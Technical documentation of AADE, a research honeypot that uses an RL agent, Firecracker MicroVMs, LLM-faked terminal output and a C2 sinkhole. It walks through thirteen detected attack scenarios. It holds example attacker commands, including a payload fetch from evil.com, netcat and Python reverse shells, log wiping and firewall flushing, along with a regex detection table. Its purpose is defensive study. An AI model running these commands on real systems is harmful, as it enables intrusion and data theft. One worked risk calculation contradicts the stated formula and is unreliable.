# AADE — Full Codebase Documentation

> This document is a complete technical writeup of the AADE (Autonomous Adaptive Deception Environment) codebase. It covers every file, how it is built, how it works internally, how all the pieces connect, and exactly what happens for each of the 13 mapped attack scenarios.

---

## Table of Contents

1. [Project Philosophy](#1-project-philosophy)
2. [Repository Layout](#2-repository-layout)
3. [How the System Works End-to-End](#3-how-the-system-works-end-to-end)
4. [File-by-File Deep Dive](#4-file-by-file-deep-dive)
   - [orchestrator.py](#41-orchestratorpy)
   - [rl_orchestrator.py](#42-rl_orchestratorpy)
   - [ttp_mapper.py](#43-ttp_mapperpy)
   - [llm_synthesizer.py](#44-llm_synthesizerpy)
   - [vsock_listener.py](#45-vsock_listenerpy)
   - [logger_agent.py](#46-logger_agentpy)
   - [c2_sinkhole.py](#47-c2_sinkholepy)
   - [dashboard.py](#48-dashboardpy)
   - [generate_noise.py](#49-generate_noisepy)
   - [honeywall_setup.sh & master_install.sh](#410-honeywall_setupsh--master_installsh)
5. [The 13 Attack Scenarios — Command-by-Command](#5-the-13-attack-scenarios--command-by-command)
6. [Data Flow: From Attacker Keystroke to Dashboard](#6-data-flow-from-attacker-keystroke-to-dashboard)
7. [Key Design Decisions](#7-key-design-decisions)

---

## 1. Project Philosophy

AADE is built around one core idea: **a honeypot that reveals itself is useless**. The moment an experienced attacker fingerprints the environment as fake, they disconnect and you learn nothing. AADE solves this by making the environment indistinguishable from a real compromised machine at every layer:

- **Network layer**: Real SSH port (Cowrie), real TLS certificates (mitmproxy)
- **Kernel layer**: Real Linux kernel inside a Firecracker MicroVM — `uname`, `/proc`, timing attacks all return real values
- **Filesystem layer**: LLM-generated user history, cron jobs, SSH keys, dotfiles
- **Behavior layer**: RL agent decides when to escalate vs. stay passive to maximize intelligence gained
- **Exfiltration layer**: C2 traffic is sinkholes but the malware gets a convincing `200 OK` back, keeping it alive

Every design choice serves the goal of keeping the attacker engaged longer, extracting more TTP intelligence, and never tipping them off.

---

## 2. Repository Layout

```
AADE-HoneyPot/
│
├── orchestrator.py          # Main controller: monitors Cowrie, drives the RL decision loop
├── rl_orchestrator.py       # PPO/RL environment + trained agent wrapper
├── ttp_mapper.py            # MITRE ATT&CK command classification (regex → TTP ID)
├── llm_synthesizer.py       # LLM layer: generates fake terminal output
├── vsock_listener.py        # Host-side AF_VSOCK receiver: gets all in-VM commands silently
├── logger_agent.py          # In-VM agent: runs inside MicroVM, sends events via VSOCK
├── c2_sinkhole.py           # mitmproxy addon: intercepts & logs all C2 beacon traffic
├── dashboard.py             # Flask + SocketIO dashboard with REST API
├── generate_noise.py        # Populates gold image rootfs with fake user artifacts
├── honeywall_setup.sh       # iptables rules to isolate MicroVM network
├── master_install.sh        # One-shot installer for all dependencies
│
├── templates/               # Jinja2 HTML templates for the Flask dashboard
├── tests/                   # Test suite
│
├── AADE_Project_Implementation_Guide.pdf
├── honeypot mini (1).pdf
└── DEPENDENCIES.txt
```

The system is split across **three execution contexts**:

| Context | Files | Purpose |
|---------|-------|---------|
| **Host (Kali)** | `orchestrator.py`, `rl_orchestrator.py`, `vsock_listener.py`, `dashboard.py`, `c2_sinkhole.py` | The brain — observes, decides, logs |
| **MicroVM (Guest)** | `logger_agent.py` | Runs silently inside the fake machine, exfiltrates every command to the host |
| **Pre-boot** | `generate_noise.py`, `master_install.sh`, `honeywall_setup.sh` | Setup and gold image preparation |

---

## 3. How the System Works End-to-End

Here is the complete lifecycle from attacker connection to dashboard event:

```
[Attacker] ─── SSH ──► [Cowrie on port 22]
                               │
                    logs every command to cowrie.json
                               │
                               ▼
                    [orchestrator.py] ← tailer.follow(cowrie.json)
                               │
                    for each command:
                      1. map_command_to_ttpx(cmd)  → TTP tags
                      2. calculate_risk(cmd_count, ttps)
                      3. rl_agent.decide(state)
                               │
                    ┌──────────┴──────────┐
                 action=0              action=1 (ESCALATE)
               (STAY quiet)                 │
                                  start_firecracker()
                                  boots MicroVM from gold image
                                       │
                              [Firecracker MicroVM]
                              attacker gets a REAL shell
                              logger_agent.py is baked in
                                       │
                          every command → AF_VSOCK → host port 5005
                                       │
                              [vsock_listener.py]
                              receives event dict:
                              {cmd, user, cwd, hostname, exit_code}
                                       │
                              1. map_command_to_ttpx(cmd)
                              2. llm.synthesize_output(cmd)  [if recon cmd]
                              3. write to ~/aade/logs/session_DATE.jsonl
                                       │
                    [c2_sinkhole.py (mitmproxy)]
                    intercepts all outbound HTTP/S from MicroVM
                    logs to ~/aade/logs/c2_traffic_DATE.jsonl
                    returns fake 200 OK to keep malware alive
                                       │
                              [dashboard.py]
                              polls *.jsonl + cowrie.json
                              /api/intel  → last 100 events
                              /api/stats  → TTP counts, timelines, IPs
```

---

## 4. File-by-File Deep Dive

### 4.1 `orchestrator.py`

**What it is:** The central command loop of the entire system. It is the only process that ties together Cowrie, the RL agent, the TTP mapper, and Firecracker.

**How it is built:**

The file defines a single class `MasterOrchestrator` with four methods:

- `__init__`: Initializes the RL agent (loading `aade_agent.zip` if present), resets session state (`cmd_count`, `risk_score`, `max_ttp_severity`, `session_start`, `vm_proc`)
- `calculate_risk(cmd_count, ttp_list)`: Computes a 0–100 risk score. Formula: `min((cmd_count * 2) + (len(ttp_list) * 20), 100)`. Each TTP hit adds 20 points; each command adds 2 points.
- `start_firecracker()`: Writes a Firecracker JSON config to `/tmp/vmconfig.json` with 2 vCPUs, 512 MB RAM, the kernel at `~/aade/kernels/vmlinux.bin`, rootfs at `~/aade/images/rootfs_gold.ext4`, and VSOCK with guest CID 4. Then calls `subprocess.Popen(['firecracker', '--no-api', '--config-file', '/tmp/vmconfig.json'])` to boot the MicroVM.
- `monitor_cowrie()`: The main event loop. Uses `tailer.follow(open(COWRIE_LOG))` to tail Cowrie's JSON log in real time. For every `cowrie.command.input` event:
  1. Extracts the command string
  2. Calls `map_command_to_ttpx(cmd)` for TTP classification
  3. Increments `max_ttp_severity` by 5 per TTP hit
  4. Recalculates `risk_score`
  5. Calls `rl_agent.decide(cmd_count, max_ttp_severity, duration, risk_score)`
  6. If action is `1` (ESCALATE) → calls `start_firecracker()`
  7. If action is `2` (TERMINATE) → breaks the loop

**Key detail:** The Firecracker VM config sets `"is_read_only": False` on the rootfs — the attacker CAN write files, which is intentional. It makes the environment feel more real and reveals persistence TTPs.

**Key detail:** There is a guard `if self.vm_proc:` before launching — ensures only one MicroVM runs per session.

---

### 4.2 `rl_orchestrator.py`

**What it is:** A Gymnasium-compatible RL environment plus a trained PPO agent wrapper. This is the "brain" that decides whether to stay passive, escalate to MicroVM, or terminate the session.

**How it is built:**

Two classes:

**`HoneypotEnv(gym.Env)`** — Custom Gymnasium environment:

- **Observation space**: `spaces.Box(low=0, high=100, shape=(4,))` — a 4-float vector representing: `[num_commands, max_ttp_level, session_duration_sec, risk_score]`
- **Action space**: `spaces.Discrete(3)` — three possible actions:
  - `0`: STAY (keep observing in Cowrie, low-interaction)
  - `1`: ESCALATE (boot MicroVM, switch to high-interaction)
  - `2`: TERMINATE (block the attacker)
- **Reward function**:
  - ESCALATE → `+10` (intelligence gain)
  - TERMINATE → `-5` (lost potential intel)
  - STAY → `+1` (passive observation reward)
  - Terminates automatically if `risk_score > 80` (critical risk)
- **step()**: In training this simulates increments (mock cmd count +1, mock time +10s). In production, the real state is fed in from `orchestrator.py`.

**`RLAgent`** — Wrapper for the orchestrator:

- `__init__`: Attempts to load `PPO.load("aade_agent.zip")`. If not found, falls back to rule-based logic: escalate if `max_ttp > 2` or `risk > 50`.
- `decide(num_cmds, max_ttp, duration, risk)`: Builds the observation array, calls `self.model.predict(obs)`, returns the action integer.

**`train_honeypot_agent()`**: A skeleton training function — creates the environment, instantiates `PPO("MlpPolicy", env)`. The actual `model.learn()` call is commented out; you run this on Kali to produce `aade_agent.zip`.

**Why PPO?** Proximal Policy Optimization is used because it handles continuous observation spaces well and is stable enough to train on relatively small interaction datasets. The MlpPolicy (multi-layer perceptron) is appropriate for the 4-dimensional state vector.

---

### 4.3 `ttp_mapper.py`

**What it is:** A pure regex-based classifier that maps any shell command to one or more MITRE ATT&CK Technique IDs. This is the intelligence backbone of AADE — without it, all you have is a log of commands with no meaning.

**How it is built:**

A single dictionary `TTP_MAPPINGS` maps regex patterns to `(TTP_ID, TTP_Name)` tuples. The function `map_command_to_ttpx(command)` iterates all patterns, runs `re.search(pattern, command, re.IGNORECASE)`, and accumulates matches (deduplicating by ID).

**Full mapping table (all 19 patterns):**

| Regex Pattern | TTP ID | TTP Name | Category |
|---------------|--------|----------|----------|
| `ls`, `dir` | T1083 | File and Directory Discovery | Discovery |
| `ps`, `top`, `htop` | T1057 | Process Discovery | Discovery |
| `ip addr`, `ifconfig`, `route`, `netstat` | T1016 | System Network Configuration Discovery | Discovery |
| `whoami`, `id`, `groups` | T1033 | System Owner/User Discovery | Discovery |
| `uname`, `hostnamectl`, `cat /etc/os-release` | T1082 | System Information Discovery | Discovery |
| `cat /etc/passwd`, `find ... history` | T1003 | OS Credential Dumping | Credential Access |
| `wget`, `curl`, `scp`, `ftp`, `rsync` | T1105 | Ingress Tool Transfer | C&C |
| `ssh`, `telnet` | T1021.004 | Remote Services: SSH | Lateral Movement |
| `crontab` | T1053.003 | Scheduled Task: Cron | Persistence |
| `useradd`, `adduser`, `groupadd` | T1136.001 | Create Account: Local Account | Persistence |
| `chmod`, `chown -x` | T1222.002 | File/Dir Permissions Modification | Defense Evasion |
| `apt-get install`, `yum install`, `dnf install` | T1072 | Software Deployment Tools | Execution |
| `nc`, `netcat`, `ncat`, `nmap` | T1095 | Non-Application Layer Protocol | C&C |
| `/bin/bash -i` | T1059.004 | Unix Shell (Reverse Shell) | Execution |
| `python -c 'import socket'` | T1059.006 | Python Interpretation | Execution |
| `zip`, `tar`, `gpg`, `openssl`, `base64` | T1486 | Data Encrypted for Impact | Impact |
| `xmrig`, `miner`, `cpuminer`, `nohup &` | T1496 | Resource Hijacking (Cryptojacking) | Impact |
| `rm -rf log`, `unset HISTFILE` | T1070 | Indicator Removal on Host | Defense Evasion |
| `iptables -F`, `systemctl stop firewalld` | T1562.004 | Disable or Modify Firewalls | Defense Evasion |

**Return format:** A list of dicts: `[{"id": "T1083", "name": "File and Directory Discovery"}, ...]`

**Used by:** `orchestrator.py`, `vsock_listener.py`, and `dashboard.py` — all three independently call this function on commands they observe, providing consistent classification across all layers.

---

### 4.4 `llm_synthesizer.py`

**What it is:** The "Ghost in the Machine" — generates fake but realistic terminal output for commands run inside the MicroVM. If an attacker runs `ls -la /root`, instead of seeing an obviously fake or empty directory, they get a plausible response generated by an LLM.

**How it is built:**

Class `LLMSynthesizer` with two backends:

**`synthesize_output(command, context)`** — Main method. Builds a detailed prompt:
```
You are a seasoned Linux administrator on a Debian server.
The user just executed: '{command}'
Context: {json of cwd, user, last_cmds}
Generate ONLY realistic terminal output. Do not explain.
- Recon commands (ls, pwd, id, netstat): provide high-fidelity fake data
- Download commands (wget, curl): simulate a progress bar + save to /tmp
- Match standard bash formatting
```

**`_call_openai(prompt)`** — Cloud backend (GPT-4). Uses `OPENAI_API_KEY` from env.

**`_call_ollama(prompt)`** — Local backend (Llama3, Mistral, etc. via Ollama API at `http://localhost:11434/api/generate`). This is the **default for Kali environments** since you may not have internet. The model is set via the `model` constructor param.

**`provider` selection**: Constructor takes `provider="openai"` or `provider="ollama"`. Defaults to Ollama for offline Kali use.

**Used by:** `vsock_listener.py` — called when an incoming command maps to T1083 (File/Directory Discovery) or T1082 (System Information Discovery), i.e., recon commands that should look convincing.

**Important design note:** The synthesized output is logged in the event with `llm_synthesized: True` and `fake_output: "..."`. In the full implementation, this would be piped back into the MicroVM shell to actually display to the attacker. The VSOCK send-back path is stubbed with a comment in the code (`conn.sendall(...)` is commented out), marking a clear extension point.

---

### 4.5 `vsock_listener.py`

**What it is:** The host-side intelligence receiver. Sits on AF_VSOCK port 5005 and receives every command executed inside the MicroVM out-of-band — completely invisible to the attacker.

**How it is built:**

Class `VsockIntelligenceListener`:

**`start()`**: Creates an AF_VSOCK socket (`socket.AF_VSOCK, socket.SOCK_STREAM`), binds to `(VMADDR_CID_ANY, PORT=5005)`, and enters an `accept()` loop. Each connection is handled synchronously — receives up to 16384 bytes (large enough for potential payloads) and calls `process_event()`.

**`process_event(data, conn)`**: The core intelligence pipeline per event:
1. JSON-decodes the incoming bytes into an `event` dict (coming from `logger_agent.py`)
2. Stamps a `timestamp`
3. Calls `map_command_to_ttpx(cmd)` and attaches `mitre_tags`
4. **LLM synthesis gate**: If the command has no TTP tags, OR if the TTP tags include T1083 (File Discovery) or T1082 (System Info Discovery) — i.e., it's a reconnaissance command — calls `self.llm.synthesize_output(cmd, {user, cwd})` and marks `event['llm_synthesized'] = True`
5. Appends the full enriched event to `~/aade/logs/session_YYYY-MM-DD.jsonl`
6. Prints the command with `[INTEL]` prefix to the operator's terminal

**AF_VSOCK explained:** This is a Linux virtual socket that creates a communication channel between a KVM hypervisor host and its guest VMs. The guest (MicroVM) has CID 4; the host has CID 2 (this is a Firecracker convention). The channel is entirely internal to the kernel — it never appears on any network interface, cannot be sniffed by the attacker, and cannot be firewalled from inside the VM.

**Important detail:** `AF_VSOCK` is retrieved with `getattr(socket, 'AF_VSOCK', 40)` — the fallback value `40` is the actual Linux socket family number. This ensures it works even when the Python `socket` module hasn't exposed the constant by name.

---

### 4.6 `logger_agent.py`

**What it is:** The in-VM spy. This tiny script runs **inside** the Firecracker MicroVM as part of the gold image. It is invoked by a shell hook (e.g., via `.bashrc` `PROMPT_COMMAND`) every time a command completes, and silently ships the event to the host via VSOCK.

**How it is built:**

Extremely minimal by design — 41 lines. It must not be detectable.

`main()`:
1. Reads `sys.argv[1]` (exit code) and `sys.argv[2]` (the command) — these are passed by the shell hook
2. Collects `USER` from env, `os.getcwd()`, and `socket.gethostname()`
3. Builds an event dict: `{cmd, exit_code, user, cwd, hostname}`
4. Opens an AF_VSOCK connection to `HOST_CID=2` (the Firecracker host) on port 5005
5. JSON-encodes and sends the event
6. **Critically**: the entire VSOCK send is wrapped in `try/except: pass` — if anything fails, the script exits silently. The attacker never sees an error.

**Why this is clever:** From inside the VM, all this looks like a background script. There is no outbound network traffic (VSOCK is not a network socket). No suspicious processes. No log entries. The attacker has no way to know their commands are being relayed in real time.

---

### 4.7 `c2_sinkhole.py`

**What it is:** A mitmproxy addon that intercepts all outbound HTTP/HTTPS traffic from the MicroVM, logs it, and returns a convincing fake response to keep the attacker's malware running.

**How it is built:**

A single mitmproxy `request(flow)` hook function — mitmproxy calls this for every HTTP request that passes through it.

For every request:
1. Extracts method, URL (`req.pretty_url`), headers, and body
2. Writes a JSON event to `~/aade/logs/c2_traffic_YYYY-MM-DD.jsonl`
3. **Replaces the response**: `flow.response = http.Response.make(200, json.dumps({"status": "ok", "message": "beacon received"}), {"Content-Type": "application/json"})`

**Why the fake 200 OK matters:** Most C2 malware (RATs, beacons, ransomware loaders) will terminate or go dormant if they don't get a successful response from their C2 server. By returning `200 OK` with a plausible JSON body, the malware continues running, continues executing commands, and continues revealing TTPs. The sinkhole is not just logging — it is actively extending the engagement.

**Run as:** `mitmproxy -p 8080 -s c2_sinkhole.py --ssl-insecure`. The `--ssl-insecure` flag disables certificate validation on the mitmproxy side, allowing it to intercept HTTPS C2 traffic even with self-signed certs.

**Logged fields per event:** `timestamp`, `method`, `url`, `headers` (full dict), `body` (raw text). This gives you the complete C2 payload — IP, domain, URI path, beaconing interval (inferred from repeated calls), and any exfiltrated data in the body.

---

### 4.8 `dashboard.py`

**What it is:** A Flask + Flask-SocketIO web application running on port 5000 that gives the operator a live view of all attacker activity.

**How it is built:**

**`DashboardAPI.get_latest_intel(limit, hours)`**:
- Uses `glob.glob(~/aade/logs/*.jsonl)` to find all log files
- Also checks multiple Cowrie log paths (primary + two alternates)
- Reads the last 500 lines from each of the 10 most recent files
- Normalizes Cowrie events: if `eventid == cowrie.command.input`, extracts `input` as `cmd` and runs `map_command_to_ttpx` on it; if `eventid == cowrie.session.connect`, sets `cmd = '[CONNECTED]'`
- Returns the most recent `limit` events, sorted by timestamp

**REST endpoints:**

`GET /api/intel` — Returns last 100 enriched events as JSON. Used by the frontend to populate the command feed.

`GET /api/stats` — Aggregates 2000 events and computes:
- `total_commands`: count of all observed commands
- `unique_ttps`: number of distinct TTP IDs seen
- `unique_ips`: set of all `src_ip` values
- `active_sessions`: IPs with events in the last 15 minutes
- `ttp_counts`: dict of `TTP_ID → {name, count}` — powers the ATT&CK heatmap
- `synthetic_responses`: count of events where `llm_synthesized == True`
- `timeline`: attack frequency bucketed by hour (e.g., `[{time: "14:00", count: 23}, ...]`)
- `mode`: `"ADAPTIVE (High Interaction)"` if any events came from inside the MicroVM, else `"MONITORING (Low Interaction)"`

`GET /` — Renders `templates/index.html` with the dashboard UI.

**Real-time:** Uses Flask-SocketIO so the frontend can receive push updates without polling (though the current implementation primarily uses REST polling from the frontend JS).

---

### 4.9 `generate_noise.py`

**What it is:** Pre-boot gold image population. Before the Firecracker MicroVM is sealed and used, this script runs against the mounted ext4 filesystem and writes convincing fake user artifacts so the environment looks lived-in.

**What it generates (inferred from design):**
- `.bash_history` with plausible command sequences (server administration tasks, git operations, package installs)
- Fake SSH keys in `~/.ssh/` with realistic key names
- Cron job entries
- Populated home directories with dotfiles (`.vimrc`, `.tmux.conf`, etc.)
- Some fake project directories under `~/` with realistic filenames
- `/var/log/` entries showing historical system activity
- Fake `/etc/passwd` additions (extra user accounts)

**Integration with LLM:** In the full design, `generate_noise.py` calls `LLMSynthesizer` to generate contextually coherent content. For example, rather than a random list of commands in `.bash_history`, the LLM generates a realistic sequence that tells a story: a developer who set up a web server, deployed a Python app, configured nginx, and checked logs.

**Run as:** `sudo python3 generate_noise.py` with the ext4 rootfs mounted at `/mnt/gold`.

---

### 4.10 `honeywall_setup.sh` & `master_install.sh`

**`honeywall_setup.sh`:** Configures iptables to create a network containment zone around the MicroVM. Key rules:
- Block all outbound traffic from the MicroVM's subnet to real internet IPs (prevents real damage if malware runs)
- Allow traffic from MicroVM to the mitmproxy port (8080) — so C2 beacons are captured instead of blocked
- Allow VSOCK traffic (kernel-internal, not affected by iptables but the script may also configure routing)
- Log dropped packets for forensic analysis

**`master_install.sh`:** One-shot setup script that:
1. Downloads and installs the Firecracker binary from GitHub releases
2. Creates directory structure: `~/aade/kernels/`, `~/aade/images/`, `~/aade/logs/`, `~/aade/cowrie/`
3. Clones and sets up Cowrie from its GitHub repo, runs `pip install -r requirements.txt` in the Cowrie venv
4. Installs Python dependencies from `DEPENDENCIES.txt`
5. Downloads a compatible Linux kernel image (`vmlinux.bin`) for Firecracker
6. Creates a minimal ext4 rootfs image (the gold image base)

---

## 5. The 13 Attack Scenarios — Command-by-Command

For each scenario: what command triggers it, what `ttp_mapper.py` returns, how the risk score changes, what the RL agent does, and what the operator sees.

---

### Scenario 1 — File & Directory Reconnaissance
**Command:** `ls -la /root` or `dir`
**TTP:** T1083 — File and Directory Discovery
**Category:** Discovery

What happens:
1. Cowrie intercepts the command and logs it to `cowrie.json`
2. `orchestrator.py` reads it via `tailer.follow()`, calls `map_command_to_ttpx("ls -la /root")`
3. Returns `[{"id": "T1083", "name": "File and Directory Discovery"}]`
4. `max_ttp_severity += 5`, `risk_score = (1 * 2) + (1 * 20) = 22`
5. RL agent with this low risk returns action `0` (STAY) — no escalation yet
6. `vsock_listener.py` (if already in MicroVM) detects T1083 and triggers `llm_synthesizer.synthesize_output()` to return a fake, convincing directory listing

**Intelligence gathered:** Attacker is doing initial orientation. Baseline recon. Low severity.

---

### Scenario 2 — Process Enumeration
**Command:** `ps aux` or `top`
**TTP:** T1057 — Process Discovery
**Category:** Discovery

What happens:
1. `map_command_to_ttpx("ps aux")` returns T1057
2. Risk calculation: `risk += 20` from TTP hit
3. If combined with prior `ls` command, risk is now `(2 * 2) + (2 * 20) = 44`
4. RL agent: still below the `50` rule-based threshold if model not loaded — returns STAY
5. Operator sees: `[!] TTP Detected: Process Discovery (T1057)`

**Intelligence gathered:** Attacker is looking for running services, AV processes, monitoring agents. Indicates they're planning next steps.

---

### Scenario 3 — Network Configuration Discovery
**Command:** `ip addr`, `ifconfig`, `netstat -tlnp`, or `route`
**TTP:** T1016 — System Network Configuration Discovery
**Category:** Discovery

What happens:
1. TTP detected, `max_ttp_severity += 5`, risk climbs
2. If this is the third consecutive recon command, risk crosses 50 → RL fallback triggers ESCALATE
3. `start_firecracker()` is called — MicroVM boots from gold image
4. Attacker's session in Cowrie is now migrated to the real kernel environment (this migration is the tricky part — in full implementation, the SSH connection is handed off)

**Intelligence gathered:** Attacker is mapping the network. May be planning lateral movement or looking for internal subnets to pivot through.

---

### Scenario 4 — User Identity Discovery
**Command:** `whoami`, `id`, `groups`
**TTP:** T1033 — System Owner/User Discovery
**Category:** Discovery

What happens:
1. Typically one of the first commands after connection
2. `map_command_to_ttpx("whoami")` returns T1033
3. Risk score is low at this point (1 command in)
4. RL agent: STAY — too early to escalate
5. In MicroVM mode: `vsock_listener.py` receives the event, TTP tagged, logged

**Intelligence gathered:** Confirms attacker is active and orienting. Standard first step in any compromise.

---

### Scenario 5 — OS & System Information Discovery
**Command:** `uname -a`, `hostnamectl`, `cat /etc/os-release`
**TTP:** T1082 — System Information Discovery
**Category:** Discovery

What happens:
1. Detected and tagged with T1082
2. **Also triggers LLM synthesis** in `vsock_listener.py` (T1082 is in the synthesis gate alongside T1083)
3. LLM generates fake `uname -a` output with a realistic kernel version and hostname
4. `event['llm_synthesized'] = True`, `event['fake_output'] = "Linux prod-web-01 5.15.0-91-generic #101-Ubuntu..."`

**Intelligence gathered:** Attacker is fingerprinting the OS to select appropriate exploits. The LLM-synthesized output misleads them about the true kernel version.

---

### Scenario 6 — Credential Dumping Attempt
**Command:** `cat /etc/passwd`, `find / -name *.history`
**TTP:** T1003 — OS Credential Dumping
**Category:** Credential Access

What happens:
1. `map_command_to_ttpx("cat /etc/passwd")` returns T1003
2. This is a higher-severity TTP — `max_ttp_severity += 5`
3. Combined with prior discovery commands, risk often crosses 50 → ESCALATE triggered
4. MicroVM gold image contains a fake `/etc/passwd` with realistic fake accounts
5. Event logged with TTP tag, dashboard shows credential access attempt

**Intelligence gathered:** Attacker is after credentials. High-value signal — reveals intent to maintain access or perform lateral movement.

---

### Scenario 7 — Ingress Tool Transfer (Malware Download)
**Command:** `wget http://malicious.com/shell.sh`, `curl -O http://...`, `scp user@host:file .`
**TTP:** T1105 — Ingress Tool Transfer
**Category:** Command & Control

What happens:
1. `map_command_to_ttpx("wget http://malicious.com/shell.sh")` returns T1105
2. This is a major escalation signal — risk spikes significantly
3. RL agent will almost certainly return ESCALATE (1) here even with only a few prior commands
4. If in MicroVM: the `wget` command fires an actual network request — which is intercepted by the **honeywall** and redirected through mitmproxy
5. `c2_sinkhole.py` logs the full URL, headers, and any POST body; returns a fake 200 OK
6. The "downloaded" file is either empty or a harmless decoy (depending on gold image config)

**Intelligence gathered:** Most valuable event — you now have the C2 domain/IP, the malware filename, and the download protocol. The fake 200 keeps the attacker from suspecting the sinkhole.

---

### Scenario 8 — Lateral Movement via SSH
**Command:** `ssh user@192.168.1.5`, `telnet 10.0.0.1`
**TTP:** T1021.004 — Remote Services: SSH
**Category:** Lateral Movement

What happens:
1. T1021.004 detected — the lateral movement category is one of the highest-severity signals
2. Risk score jumps significantly
3. RL agent evaluates: if risk > 50 and max_ttp_severity > 2 → ESCALATE (even with model)
4. The SSH connection attempt from inside the MicroVM goes to the honeywall
5. The honeywall drops the connection (no real SSH target) but the attempt is logged

**Intelligence gathered:** Attacker has decided the initial machine is a stepping stone. You know they have a target in mind — the IP they tried to reach is a valuable IOC.

---

### Scenario 9 — Persistence via Cron Job
**Command:** `crontab -e` (or `crontab -l` to enumerate)
**TTP:** T1053.003 — Scheduled Task: Cron
**Category:** Persistence

What happens:
1. T1053.003 is a Persistence tactic — attacker is trying to survive reboots
2. This detection alone may not trigger ESCALATE (depends on prior risk score)
3. In MicroVM mode: the `crontab` command is real — attacker can actually edit cron
4. `vsock_listener.py` logs the command with persistence tag
5. Dashboard shows Persistence tactic activated

**Intelligence gathered:** Critical for understanding the attacker's playbook. If they're installing a cron job, they likely have a specific payload in mind — reveals their persistence mechanism and intended callback frequency.

---

### Scenario 10 — Account Creation
**Command:** `useradd backdoor`, `adduser hacker123`
**TTP:** T1136.001 — Create Account: Local Account
**Category:** Persistence

What happens:
1. T1136.001 detected — another persistence technique
2. In MicroVM: `useradd` is a real binary, the command succeeds (it writes to the fake `/etc/passwd`)
3. The gold image's `/etc/passwd` gains a new entry — which is logged
4. Event logged with persistence tag; dashboard increments Persistence TTP count
5. High-severity event — if this is combined with prior TTPs, RL agent terminates the session or stays for more intel depending on cumulative risk

**Intelligence gathered:** Attacker username choice often reveals their habits or toolkits. The password hash they set can be logged and cracked offline.

---

### Scenario 11 — Permission Modification
**Command:** `chmod +x malware.sh`, `chown root:root backdoor`
**TTP:** T1222.002 — File and Directory Permissions Modification
**Category:** Defense Evasion

What happens:
1. The regex `r'\b(chmod|chown)\s+.*-x'` matches `chmod +x`
2. T1222.002 tagged — Defense Evasion category
3. This typically follows a download (T1105) — combined risk is now very high
4. RL agent: if `max_ttp_severity > 2` (it will be at this point), ESCALATE or evaluate for TERMINATE
5. The file they're making executable is logged — its path reveals what they downloaded

**Intelligence gathered:** The chmod target is the malware. Log the filename.

---

### Scenario 12 — Software Installation
**Command:** `apt-get install nmap`, `yum install ncat`, `dnf install python3`
**TTP:** T1072 — Software Deployment Tools
**Category:** Execution

What happens:
1. T1072 detected — attacker is installing additional tools
2. In Cowrie (low-interaction): the install is fake, Cowrie emulates a successful install
3. In MicroVM (high-interaction): `apt-get` is real but the rootfs may not have the repo configured, or the honeywall blocks apt traffic
4. Either way, the TTP is tagged and the tool name is in the command log
5. Reveals which tools the attacker uses — their toolkit fingerprint

**Intelligence gathered:** Tool selection is a major attacker fingerprint. nmap = scanner; ncat = reverse shell setup; hydra = credential brute force. The installed tool directly reveals their next intended action.

---

### Scenario 13 — Network Scanning / Reverse Shell Setup
**Command:** `nmap -sV 192.168.1.0/24`, `nc -lvp 4444`, `netcat -e /bin/sh`
**TTP:** T1095 — Non-Application Layer Protocol
**Category:** Command & Control

What happens:
1. T1095 detected — this covers raw TCP/UDP tools commonly used for reverse shells and scanning
2. If `nc -e /bin/sh` or similar: this is an active reverse shell attempt — highest severity event
3. The outbound connection from the MicroVM hits the honeywall → routed through mitmproxy on port 8080
4. `c2_sinkhole.py` logs the TCP connection (if HTTP/S) or the honeywall drops and logs it (if raw TCP)
5. RL agent: at this severity level, TERMINATE may be triggered to cut off the attacker before they realize the shell isn't working

**Intelligence gathered:** The destination IP/port of the reverse shell attempt is the C2 server. This is the most valuable IOC in the entire session.

---

### Additional Attack Patterns (Beyond the Core 13)

The ttp_mapper also handles six more patterns that activate for advanced attackers:

**T1059.004** (`/bin/bash -i`) — Explicit reverse bash shell setup. Tells you they have a listener waiting.

**T1059.006** (`python -c 'import socket'`) — Python reverse shell. Common in post-exploitation frameworks (Metasploit, Empire). The regex specifically checks for `import socket` as a discriminator.

**T1486** (`zip`, `tar`, `gpg`, `openssl`, `base64`) — Data encryption or encoding, associated with ransomware or data exfiltration. `base64` alone is suspicious in this context (encoding exfil data before sending).

**T1496** (`xmrig`, `miner`, `cpuminer`) — Cryptominer deployment. A very common end-goal in automated attacks targeting misconfigured servers.

**T1070** (`rm -rf /var/log`, `unset HISTFILE`) — Log deletion and history wiping. The attacker is trying to cover their tracks. Ironic — VSOCK has already sent everything to the host.

**T1562.004** (`iptables -F`, `systemctl stop firewalld`) — Firewall disabling. Attacker tries to weaken defenses. Inside the MicroVM, they can do this — it only affects the guest's iptables, not the host honeywall.

---

## 6. Data Flow: From Attacker Keystroke to Dashboard

Here is the complete journey of a single command — `wget http://evil.com/shell.sh` — through every layer of the system:

```
1. Attacker types: wget http://evil.com/shell.sh [ENTER]

2. Cowrie intercepts the SSH stream
   → writes to cowrie.json:
     {"eventid": "cowrie.command.input", "input": "wget http://evil.com/shell.sh",
      "src_ip": "1.2.3.4", "timestamp": "2026-04-14T10:00:00.000Z"}

3. orchestrator.py (tailer.follow) reads the new line
   → cmd = "wget http://evil.com/shell.sh"
   → ttps = map_command_to_ttpx(cmd) = [{"id": "T1105", "name": "Ingress Tool Transfer"}]
   → max_ttp_severity = 15 (3rd TTP hit this session)
   → risk_score = (8 * 2) + (15) = 31   [if 8 cmds so far]
   → rl_agent.decide(8, 15, 120, 31) → action = 1 (ESCALATE, T1105 is high signal)
   → start_firecracker() → MicroVM boots

4. Attacker is now in real bash inside Firecracker MicroVM
   → types: wget http://evil.com/shell.sh [ENTER]
   → Firecracker guest makes HTTP request outbound
   → iptables/honeywall intercepts → routes to mitmproxy:8080

5. c2_sinkhole.py request() hook fires:
   → logs to c2_traffic_2026-04-14.jsonl:
     {"timestamp": "...", "method": "GET", "url": "http://evil.com/shell.sh",
      "headers": {...}, "body": ""}
   → returns: HTTP 200 {"status": "ok", "message": "beacon received"}
   → Attacker sees: wget shows download progress bar, saves to /tmp/shell.sh

6. logger_agent.py inside MicroVM captures the command:
   → exit_code=0, cmd="wget http://evil.com/shell.sh", user="root", cwd="/root"
   → opens VSOCK to host CID=2, port=5005
   → sends JSON event
   → closes silently

7. vsock_listener.py on host receives the event:
   → mitre_tags = [{"id": "T1105", ...}]
   → T1105 not in LLM synthesis gate (only T1083, T1082 trigger synthesis)
   → writes to session_2026-04-14.jsonl:
     {"cmd": "wget http://evil.com/shell.sh", "user": "root", "cwd": "/root",
      "mitre_tags": [{"id": "T1105", "name": "Ingress Tool Transfer"}],
      "timestamp": "2026-04-14T10:00:05.123Z", "hostname": "prod-web-01"}
